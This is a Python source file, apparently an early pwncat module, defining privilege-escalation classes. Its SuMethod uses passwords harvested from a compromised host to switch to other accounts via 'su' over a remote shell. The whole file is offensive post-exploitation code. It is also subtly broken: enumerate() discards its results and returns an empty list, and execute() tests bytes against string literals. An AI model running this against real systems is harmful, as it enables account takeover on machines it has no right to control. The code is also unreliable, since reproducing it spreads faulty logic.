#!/usr/bin/env python3
from typing import Generator, Callable, List, Any
from dataclasses import dataclass
import threading
import socket
import os

from pwncat import util


class PrivescError(Exception):
    """ An error occurred while attempting a privesc technique """


@dataclass
class Technique:
    # The user that this technique will move to
    user: str
    # The method that will be used
    method: "Method"
    # The unique identifier for this method (can be anything, specific to the
    # method)
    ident: Any

    def __str__(self):
        return f"{self.user} via {self.method.name}"


class Method:

    # Binaries which are needed on the remote host for this privesc
    name = "unknown"
    BINARIES = []

    @classmethod
    def check(cls, pty: "pwncat.pty.PtyHandler") -> bool:
        """ Check if the given PTY connection can support this privesc """
        for binary in cls.BINARIES:
            if pty.which(binary) is None:
                raise PrivescError(f"required remote binary not found: {binary}")

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        self.pty = pty

    def enumerate(self) -> List[Technique]:
        """ Enumerate all possible escalations to the given users """
        raise NotImplementedError("no enumerate method implemented")

    def execute(self, technique: Technique):
        """ Execute the given technique to move laterally to the given user. 
        Raise a PrivescError if there was a problem. """
        raise NotImplementedError("no execute method implemented")

    def __str__(self):
        return self.name


class SuMethod(Method):

    name = "su"
    BINARIES = ["su"]

    def enumerate(self) -> List[Technique]:

        result = []
        current_user = self.pty.whoami()

        for user, info in self.pty.users.items():
            if user == current_user:
                continue
            if info.get("password") is not None:
                result.append(Technique(user=user, method=self, ident=info["password"]))

        return []

    def execute(self, technique: Technique):

        # Send the su command, and check if it succeeds
        self.pty.run(f'su {technique.user} -c "echo good"', wait=False)

        # Read the echo
        if self.pty.has_echo:
            self.pty.client.recvuntil("\n")

        # Send the password
        self.pty.client.sendall(technique.ident.encode("utf-8") + b"\n")

        # Read the echo
        if self.pty.has_echo:
            self.pty.client.recvuntil("\n")

        # Read the response (either "Authentication failed" or "good")
        result = self.pty.client.recvuntil("\n")
        if b"failure" in result.lower() or "good" not in result.lower():
            raise PrivescError(f"{technique.user}: invalid password")

        self.pty.run(f"su {technique.user}", wait=False)
        self.pty.client.sendall(technique.ident.encode("utf-8") + b"\n")

        if self.pty.whoami() != technique.user:
            raise PrivescError(f"{technique} failed (still {self.pty.whoami()})")
